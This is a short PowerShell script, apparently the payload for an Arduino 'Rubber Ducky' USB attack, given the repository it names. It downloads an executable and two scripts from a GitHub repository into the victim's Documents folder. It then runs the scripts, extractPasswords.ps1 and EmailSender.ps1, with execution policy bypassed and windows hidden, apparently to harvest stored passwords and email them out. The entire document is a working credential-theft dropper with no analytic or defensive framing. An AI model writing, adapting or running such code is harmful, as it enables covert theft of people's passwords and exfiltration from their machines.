# Define the URLs and file paths
$urls = @(
    "https://github.com/RRR3d/ArduinoRubberDucky/raw/main/pass.exe",
    "https://github.com/RRR3d/ArduinoRubberDucky/raw/main/extractPasswords.ps1",
    "https://github.com/RRR3d/ArduinoRubberDucky/raw/main/EmailSender.ps1"
)
$filePaths = @(
    "$env:USERPROFILE\Documents\pass.exe",
    "$env:USERPROFILE\Documents\extractPasswords.ps1",
    "$env:USERPROFILE\Documents\EmailSender.ps1"
)

# Download files
$webClient = New-Object System.Net.WebClient
for ($i = 0; $i -lt $urls.Length; $i++) {
    $webClient.DownloadFile($urls[$i], $filePaths[$i])
}

# Execute extractPasswords.ps1
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$env:USERPROFILE\Documents\extractPasswords.ps1' -WindowStyle Hidden" -NoNewWindow -Wait

# Execute EmailSender.ps1
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$env:USERPROFILE\Documents\EmailSender.ps1' -WindowStyle Hidden" -NoNewWindow -Wait
